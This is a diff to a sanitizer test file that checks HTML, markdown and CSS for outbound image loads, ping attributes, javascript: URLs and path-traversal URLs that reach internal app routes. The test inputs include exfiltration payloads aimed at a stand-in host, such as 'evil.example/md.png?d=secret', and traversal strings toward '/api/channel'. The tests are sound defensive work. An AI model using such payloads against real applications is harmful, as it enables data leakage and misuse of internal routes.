@@ -75,11 +75,12 @@ describe('html output', () => {
     expect((window as { __pwned?: unknown }).__pwned).toBeUndefined()
   })
 
-  test('purifyHtml drops what would leave the page and keeps what stays on the machine', () => {
+  test('purifyHtml drops what would leave the page or reach another route, and keeps the media routes', () => {
     const origin = window.location.origin
-    const out = purifyHtml(`<img src="/api/ws/a/media/x.png"><img src="${origin}/api/x.png"><img src="//evil.example/x.png"><a href="#note" ping="https://evil.example/p">n</a>`)
-    expect(out).toContain('src="/api/ws/a/media/x.png"')
-    expect(out).toContain(`src="${origin}/api/x.png"`)
+    const out = purifyHtml(`<img src="/api/ws/a/media?path=x.png"><img src="${origin}/api/ws/a/views/v/media?path=y.png"><img src="${origin}/api/x.png"><img src="//evil.example/x.png"><a href="#note" ping="https://evil.example/p">n</a>`)
+    expect(out).toContain('src="/api/ws/a/media?path=x.png"')
+    expect(out).toContain(`src="${origin}/api/ws/a/views/v/media?path=y.png"`)
+    expect(out).not.toContain('/api/x.png')
     expect(out).not.toContain('evil.example')
     expect(out).not.toContain('ping')
   })
@@ -126,15 +127,24 @@ describe('svg output', () => {
 })
 
 describe('markdown', () => {
-  const md = '![leak](https://evil.example/md.png?d=secret) and ![kept](/api/ws/w/media/a.png)'
+  const md = '![leak](https://evil.example/md.png?d=secret) and ![kept](/api/ws/w/media?path=a.png)'
 
   test('a markdown image from another host is drawn as its alt text, in an output and in the chat', async () => {
     for (const node of [<Output bundle={{ 'text/markdown': md }} />, <ChatMarkdown text={md} />]) {
       const el = await mount(node)
       const srcs = Array.from(el.querySelectorAll('img')).map((i) => i.getAttribute('src'))
-      expect(srcs).toEqual(['/api/ws/w/media/a.png'])
+      expect(srcs).toEqual(['/api/ws/w/media?path=a.png'])
       expect(el.textContent).toContain('leak')
     }
+  })
+
+  test('markdown and sanitized HTML load no app route but the media routes', async () => {
+    const el = await mount(<ChatMarkdown text={'![x](/api/channel?cwd=/c&session=s) ![y](/api/ws/w/media?path=a.png)'} />)
+    const srcs = Array.from(el.querySelectorAll('img')).map((i) => i.getAttribute('src'))
+    expect(srcs).toEqual(['/api/ws/w/media?path=a.png'])
+    const out = purifyHtml('<img src="/api/channel?cwd=/c"><img src="/api/ws/w/media?path=b.png"><div style="background:url(/api/channel)">d</div>')
+    expect(out).not.toContain('/api/channel')
+    expect(out).toContain('/api/ws/w/media?path=b.png')
   })
 
   test('raw html in chat markdown is shown as text, never parsed', async () => {
@@ -145,17 +155,23 @@ describe('markdown', () => {
 })
 
 describe('the pure checks', () => {
-  test('isLocalUrl: data: URLs, fragments and the page origin stay; any other host or scheme does not', () => {
+  test('isLocalUrl: data: and blob: URLs, fragments and the two media routes stay; any other route, host or scheme does not', () => {
     const o = 'http://127.0.0.1:8300'
-    for (const u of ['data:image/png;base64,AA', '#clip', '/api/x', 'img/a.png', `${o}/api/x`, `blob:${o}/1234`]) expect(isLocalUrl(u, o), u).toBe(true)
-    for (const u of ['https://evil.example/a.png', '//evil.example/a.png', 'http://127.0.0.1:8301/a', 'javascript:alert(1)', '', '   ']) expect(isLocalUrl(u, o), u).toBe(false)
+    const media = ['/api/ws/w/media?path=a.png', `${o}/api/ws/w/media?path=a.png`, '/api/ws/w/views/v/media?path=x.mp4#t=3']
+    for (const u of ['data:image/png;base64,AA', '#clip', `blob:${o}/1234`, ...media]) expect(isLocalUrl(u, o), u).toBe(true)
+    for (const u of ['https://evil.example/a.png', '//evil.example/a.png', 'http://127.0.0.1:8301/a', 'javascript:alert(1)', '', '   ',
+      'blob:https://evil.example/1234', 'img/a.png', 'api/ws/w/media?path=a.png', `${o}/api/x`, '/api/x',
+      '/api/channel?cwd=/c&session=s&config_dir=/tmp/x', `${o}/api/channel?cwd=/c`, '/api/ws/w/media/../../channel?cwd=/c',
+      '/api/ws/w%2F..%2F..%2Fchannel/media', '/api/ws/w/files?path=a.png', '/api/ws/w/views/v/frame', '/\\evil.example/a.png'])
+      expect(isLocalUrl(u, o), u).toBe(false)
   })
 
   test('styleReachesOut: a url() to another host, image-set(), @import and expression() reach out', () => {
     const o = 'http://127.0.0.1:8300'
     expect(styleReachesOut('clip-path: url(#p1); fill: red', o)).toBe(false)
     expect(styleReachesOut('background: url("https://evil.example/x")', o)).toBe(true)
-    expect(styleReachesOut("background: url('/api/x.png')", o)).toBe(false)
+    expect(styleReachesOut("background: url('/api/ws/w/media?path=x.png')", o)).toBe(false)
+    expect(styleReachesOut("background: url('/api/x.png')", o)).toBe(true)
     expect(styleReachesOut('background-image: image-set("x.png" 1x)', o)).toBe(true)
     expect(styleReachesOut('@import "x.css"', o)).toBe(true)
   })
